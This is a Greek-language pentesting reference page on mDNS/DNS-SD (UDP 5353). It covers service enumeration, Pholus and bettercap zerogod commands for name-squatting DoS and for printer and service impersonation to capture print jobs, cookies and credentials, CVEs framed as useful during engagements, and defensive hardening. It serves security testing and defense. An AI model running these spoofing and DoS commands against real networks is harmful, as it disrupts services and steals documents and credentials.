# 5353/UDP Multicast DNS (mDNS) και DNS-SD

{{#include ../banners/hacktricks-training.md}}

## Βασικές Πληροφορίες

Το Multicast DNS (mDNS) επιτρέπει την επίλυση ονομάτων παρόμοια με DNS και την ανακάλυψη υπηρεσιών μέσα σε ένα τοπικό σύνδεσμο χωρίς unicast DNS server. Χρησιμοποιεί UDP/5353 και τις multicast διευθύνσεις 224.0.0.251 (IPv4) και FF02::FB (IPv6). Η Ανακάλυψη Υπηρεσιών DNS (DNS-SD, που συνήθως χρησιμοποιείται με mDNS) παρέχει έναν τυποποιημένο τρόπο για την απαρίθμηση και την περιγραφή υπηρεσιών μέσω εγγραφών PTR, SRV και TXT.
```
PORT     STATE SERVICE
5353/udp open  zeroconf
```
Βασικές λεπτομέρειες του πρωτοκόλλου που θα αξιοποιείτε συχνά κατά τις επιθέσεις:
- Τα ονόματα στη ζώνη .local επιλύονται μέσω mDNS.
- Το bit QU (Query Unicast) μπορεί να ζητήσει unicast απαντήσεις ακόμα και για multicast ερωτήματα.
- Οι υλοποιήσεις πρέπει να αγνοούν πακέτα που δεν προέρχονται από το τοπικό link· ορισμένα stacks τα αποδέχονται ακόμα.
- Το probing/announcing επιβάλλει μοναδικά ονόματα host/service· παρεμβολή εδώ δημιουργεί καταστάσεις DoS/«name squatting».

## DNS-SD μοντέλο υπηρεσίας

Οι υπηρεσίες αναγνωρίζονται ως _<service>._tcp ή _<service>._udp κάτω από .local, π.χ. _ipp._tcp.local (εκτυπωτές), _airplay._tcp.local (AirPlay), _adb._tcp.local (Android Debug Bridge), κ.λπ. Εντοπίστε τύπους με _services._dns-sd._udp.local, και στη συνέχεια επιλύστε τις εντοπισμένες εγκαταστάσεις σε SRV/TXT/A/AAAA.

## Εξερεύνηση και καταγραφή δικτύου

- nmap target scan (direct mDNS on a host):
```bash
nmap -sU -p 5353 --script=dns-service-discovery <target>
```
- nmap broadcast discovery (listen to the segment and enumerate all DNS-SD types/instances):
```bash
sudo nmap --script=broadcast-dns-service-discovery
```
- avahi-browse (Linux):
```bash
# List service types
avahi-browse -bt _services._dns-sd._udp
# Browse all services and resolve to host/port
avahi-browse -art
```
- Apple dns-sd (macOS):
```bash
# Browse all HTTP services
dns-sd -B _http._tcp
# Enumerate service types
dns-sd -B _services._dns-sd._udp
# Resolve a specific instance to SRV/TXT
dns-sd -L "My Printer" _ipp._tcp local
```
- Packet capture with tshark:
```bash
# Live capture
sudo tshark -i <iface> -f "udp port 5353" -Y mdns
# Only DNS-SD service list queries
sudo tshark -i <iface> -f "udp port 5353" -Y "dns.qry.name == \"_services._dns-sd._udp.local\""
```

Συμβουλή: Ορισμένοι browsers/WebRTC χρησιμοποιούν εφήμερα mDNS hostnames για να αποκρύψουν τοπικά IP. Αν δείτε random-UUID.local υποψήφιους στο δίκτυο, επιλύστε τους με mDNS για να pivot σε τοπικά IP.

## Επιθέσεις

### Παρεμβολή στο probing ονομασίας mDNS (DoS / name squatting)

Κατά τη φάση του probing, ένας host ελέγχει τη μοναδικότητα του ονόματος. Η απάντηση με spoofed conflicts τον αναγκάζει να επιλέξει νέα ονόματα ή να αποτύχει. Αυτό μπορεί να καθυστερήσει ή να αποτρέψει την εγγραφή και την ανακάλυψη υπηρεσιών.

Παράδειγμα με Pholus:
```bash
# Block new devices from taking names by auto-faking responses
sudo python3 pholus3.py <iface> -afre -stimeout 1000
```
### Service spoofing and impersonation (MitM)

Μιμηθείτε διαφημιζόμενες υπηρεσίες DNS-SD (εκτυπωτές, AirPlay, HTTP, κοινόχρηστοι φάκελοι) για να αναγκάσετε τους clients να συνδεθούν σε εσάς. Αυτό είναι ιδιαίτερα χρήσιμο για:
- Καταγράψτε έγγραφα μέσω spoofing των _ipp._tcp ή _printer._tcp.
- Προσελκύστε clients σε υπηρεσίες HTTP/HTTPS για να συλλέξετε tokens/cookies ή να παραδώσετε payloads.
- Συνδυάστε το με NTLM relay techniques όταν Windows clients διαπραγματεύονται auth με spoofed services.

Με το bettercap’s zerogod module (mDNS/DNS-SD spoofer/impersonator):
```bash
# Start mDNS/DNS-SD discovery
sudo bettercap -iface <iface> -eval "zerogod.discovery on"

# Show all services seen from a host
> zerogod.show 192.168.1.42
# Show full DNS records for a host (newer bettercap)
> zerogod.show-full 192.168.1.42

# Impersonate all services of a target host automatically
> zerogod.impersonate 192.168.1.42

# Save IPP print jobs to disk while impersonating a printer
> set zerogod.ipp.save_path ~/.bettercap/zerogod/documents/
> zerogod.impersonate 192.168.1.42

# Replay previously captured services
> zerogod.save 192.168.1.42 target.yml
> zerogod.advertise target.yml
```
Δείτε επίσης γενικές ροές εργασίας για LLMNR/NBNS/mDNS/WPAD spoofing και credential capture/relay workflows:

{{#ref}}
../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md
{{#endref}}

### Σημειώσεις σχετικά με πρόσφατα προβλήματα υλοποίησης (χρήσιμες για DoS/persistence κατά τη διάρκεια engagements)

- Σφάλματα Avahi reachable-assertion και D-Bus crash (2023) μπορούν να τερματίσουν το avahi-daemon σε διανομές Linux (π.χ. CVE-2023-38469..38473, CVE-2023-1981), διαταράσσοντας την ανίχνευση υπηρεσιών στους στόχους μέχρι την επανεκκίνηση.
- Το Cisco IOS XE Wireless LAN Controller mDNS gateway DoS (CVE-2024-20303) επιτρέπει σε γειτονικούς WLAN clients να κατακλύσουν με crafted mDNS, αυξάνοντας τη χρήση CPU του WLC και πέφτοντας τα AP tunnels — χρήσιμο αν χρειαστεί να εξαναγκάσετε client roaming ή επανεκκινήσεις του controller κατά τη διάρκεια μιας αξιολόγησης.
- Το Apple mDNSResponder logic error DoS (CVE-2024-44183) επιτρέπει σε sandboxed τοπική διεργασία να καταρρεύσει το Bonjour και να καταστείλει προσωρινά τη δημοσίευση/αναζήτηση υπηρεσιών σε Apple endpoints· έχει γίνει patch στις τρέχουσες εκδόσεις iOS/macOS.
- Το Apple mDNSResponder correctness issue (CVE-2025-31222) επέτρεψε local privilege escalation μέσω mDNSResponder· χρήσιμο για persistence σε unmanaged Macs/iPhones, διορθώθηκε σε πρόσφατες ενημερώσεις iOS/macOS.

### Browser/WebRTC mDNS considerations

Οι σύγχρονοι Chromium/Firefox αποσιωπούν τα host candidates με τυχαία ονόματα mDNS. Μπορείτε να επανεκθέσετε LAN IPs σε managed endpoints πιέζοντας την πολιτική Chrome `WebRtcLocalIpsAllowedUrls` (ή αλλάζοντας `chrome://flags/#enable-webrtc-hide-local-ips-with-mdns`/ισοδύναμο Edge) ώστε το ICE να εκθέτει host candidates αντί για mDNS· ορίζεται μέσω `HKLM\Software\Policies\Google\Chrome`.

Όταν οι χρήστες απενεργοποιούν την προστασία χειροκίνητα (συνηθισμένο σε οδηγούς αντιμετώπισης προβλημάτων WebRTC), τα browsers τους αρχίζουν πάλι να ανακοινώνουν plain host candidates, τα οποία μπορείτε να καταγράψετε μέσω mDNS ή ICE signaling για να επιταχύνετε την ανακάλυψη hosts.

## Αμυντικές παρατηρήσεις και OPSEC

- Όρια τμημάτων: Μην προωθείτε 224.0.0.251/FF02::FB μεταξύ security zones εκτός αν απαιτείται ρητώς mDNS gateway. Αν πρέπει να γεφυρώσετε την ανακάλυψη, προτιμήστε allowlists και rate limits.
- Windows endpoints/servers:
- Για πλήρη απενεργοποίηση της ανάλυσης ονομάτων μέσω mDNS ορίστε την τιμή μητρώου και επανεκκινήστε:
```
HKLM\SYSTEM\CurrentControlSet\Services\Dnscache\Parameters\EnableMDNS = 0 (DWORD)
```
- Σε managed περιβάλλοντα, απενεργοποιήστε τον ενσωματωμένο κανόνα “mDNS (UDP-In)” του Windows Defender Firewall (τουλάχιστον στο Domain profile) για να αποτρέψετε εισερχόμενη επεξεργασία mDNS διατηρώντας λειτουργικότητα home/roaming.
- Σε νεότερα Windows 11 builds/GPO templates, χρησιμοποιήστε την πολιτική “Computer Configuration > Administrative Templates > Network > DNS Client > Configure multicast DNS (mDNS) protocol” και ορίστε την σε Disabled.
- Linux (Avahi):
- Περιορίστε τη δημοσίευση όταν δεν είναι απαραίτητη: ορίστε `disable-publishing=yes`, και περιορίστε interfaces με `allow-interfaces=` / `deny-interfaces=` στο `/etc/avahi/avahi-daemon.conf`.
- Σκεφτείτε `check-response-ttl=yes` και αποφύγετε `enable-reflector=yes` εκτός αν είναι απόλυτα απαραίτητο· προτιμήστε `reflect-filters=` allowlists όταν κάνετε reflecting.
- macOS: Περιορίστε το εισερχόμενο mDNS σε host/network firewalls όταν το Bonjour discovery δεν απαιτείται για συγκεκριμένα subnets.
- Monitoring: Ειδοποιήστε για ασυνήθιστες αυξήσεις σε ερωτήματα προς `_services._dns-sd._udp.local` ή ξαφνικές αλλαγές σε SRV/TXT κρίσιμων υπηρεσιών· αυτά είναι δείκτες spoofing ή service impersonation.

## Tooling quick reference

- nmap NSE: `dns-service-discovery` and `broadcast-dns-service-discovery`.
- Pholus: active scan, reverse mDNS sweeps, DoS and spoofing helpers.
```bash
# Passive sniff (timeout seconds)
sudo python3 pholus3.py <iface> -stimeout 60
# Enumerate service types
sudo python3 pholus3.py <iface> -sscan
# Send generic mDNS requests
sudo python3 pholus3.py <iface> --request
# Reverse mDNS sweep of a subnet
sudo python3 pholus3.py <iface> -rdns_scanning 192.168.2.0/24
```
- bettercap zerogod: εντοπίστε, αποθηκεύστε, διαφημίστε και μιμηθείτε υπηρεσίες mDNS/DNS-SD (βλ. παραδείγματα παραπάνω).

## Spoofing/MitM

The most interesting attack you can perform over this service is to perform a MitM in the communication between the client and the real server. You might be able to obtain sensitive files (MitM the communication with the printer) or even credentials (Windows authentication).\
Για περισσότερες πληροφορίες δείτε:


{{#ref}}
../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md
{{#endref}}

## Αναφορές

- [Practical IoT Hacking: The Definitive Guide to Attacking the Internet of Things](https://books.google.co.uk/books/about/Practical_IoT_Hacking.html?id=GbYEEAAAQBAJ&redir_esc=y)
- [Nmap NSE: broadcast-dns-service-discovery](https://nmap.org/nsedoc/scripts/broadcast-dns-service-discovery.html)
- [bettercap zerogod (mDNS/DNS-SD discovery, spoofing, impersonation)](https://www.bettercap.org/modules/ethernet/zerogod/)
- [Cisco IOS XE WLC mDNS gateway DoS (CVE-2024-20303) advisory](https://www.cisco.com/c/en/us/support/docs/csa/cisco-sa-wlc-mdns-dos-4hv6pBGf.html)
- [Rapid7 advisory for Apple mDNSResponder CVE-2024-44183](https://www.rapid7.com/db/vulnerabilities/apple-mdnsresponder-cve-2024-44183/)
- [Rapid7 writeup of Apple mDNSResponder CVE-2025-31222](https://www.rapid7.com/db/vulnerabilities/apple-osx-mdnsresponder-cve-2025-31222/)

{{#include ../banners/hacktricks-training.md}}
